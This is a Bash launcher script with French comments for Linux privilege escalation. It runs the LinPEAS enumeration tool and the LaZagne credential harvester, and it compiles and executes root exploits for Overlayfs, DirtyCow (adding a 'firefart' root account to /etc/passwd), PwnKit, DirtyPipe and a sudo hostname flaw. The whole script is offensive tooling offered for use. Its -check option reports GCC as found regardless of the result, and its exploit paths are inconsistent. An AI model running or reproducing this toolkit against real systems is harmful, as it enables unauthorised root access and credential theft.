#!/bin/bash

ascii() {
     cat <<"EOF"
                                                    
 $$$$$$\            $$\ $$\ $$$$$$$$\           
$$  __$$\           $$ |$$ |$$  _____|          
$$ /  \__|$$\   $$\ $$ |$$ |$$ |      $$\   $$\ 
$$$$\     $$ |  $$ |$$ |$$ |$$$$$\    \$$\ $$  |
$$  _|    $$ |  $$ |$$ |$$ |$$  __|    \$$$$  / 
$$ |      $$ |  $$ |$$ |$$ |$$ |       $$  $$<  
$$ |      \$$$$$$  |$$ |$$ |$$$$$$$$\ $$  /\$$\ 
\__|       \______/ \__|\__|\________|\__/  \__|

               by M0rPH3U53
EOF
}                                  

if [[ "$*" == "-help" ]]; then
    ascii
    echo " "
    echo " "
    echo "Usage: ./fullEx.sh COMMAND"
    echo " "
    echo "Commands:"
    echo "   -LinPeas       Execute LinPeas"
    echo "   -LaZagne       Execute LaZagne"
    echo "   -Overlays      Compilation + execution binaire - CVE-2015-1328"
    echo "   -DirtyCow      Compilation + execution binaire - CVE-2016-5195"
    echo "   -PwnKit64/32   PwnKit64/32 - CVE-2021-4034"
    echo "   -DirtyPipe     DirtyPipe - CVE-2022-0847"
    echo "   -SudoHost      Sudo Hostname - CVE-2025-32462"
    echo "   -check         Verifie si gcc est installer"
    echo "   -perm          Applique les droit d'execution sur '/fullEx'"
    echo " "
    exit 0
fi

# Application des droit d'execution
if [[ "$*" == "-perm" ]]; then
   find ${PWD} -type f -exec chmod +x {} \;
fi

# Verifie si GCC est installer
if [[ "$*" == "-check" ]]; then
   which gcc > /dev/null 2>&1
   echo "[+] GCC found !"
fi

# LinPeas
if [[ "$*" == "-LinPeas" ]]; then
   "${PWD}/linpeas/linpeas.sh"
fi

# LaZagne
if [[ "$*" == "-LaZagne" ]]; then
  "${PWD}/LaZagne/Linux/laZagne.py"
fi

# PwnKit
for arch in 64 32; do
     if [[ "$*" == "-PwnKit${arch}" ]]; then
          "${PWD}/exploit/PwnKit/PwnKit${arch}"
     fi
done

if [[ "$*" == "-Overlays" ]]; then
     gcc ${PWD}/exploit/Overlays/overlays.c -o ${PWD}/exploit/Overlays/overlays
     echo "[+] Compilation successfuly !"
     echo "[+] PATH=${PWD}/exploit/Overlays/overlays"
     echo "[+] Executing the binary..."
     ${PWD}/exploit/Overlays/overlays

fi

# DirtyCow
if [[ "$*" == "-DirtyCow" ]]; then
     gcc -pthread ${PWD}/exploits/DirtyCow/dirtycow.c -o ${PWD}/exploits/DirtyCow/dcow -lcrypt
     echo "[+] Compilation successfuly !"
     echo "[+] PATH=${PWD}/exploits/DirtyCow/dcow"
     echo "[+] Executing the binary..."
     ${PWD}/exploits/DirtyCow/dcow test
     echo "[+] User firefart created"
     cat /etc/passwd | grep 'firefart'
fi

# Sudo-Host
if [[ "$*" == "-SudoHost" ]]; then
     "${PWD}/exploit/Sudo-host/exploit.sh"
fi

# DirtyPipe
if [[ "$*" == "-DirtyPipe" ]]; then
     ${PWD}/exploit/DirtyPipe/dpipe --root
     cat /etc/passwd | grep root
fi
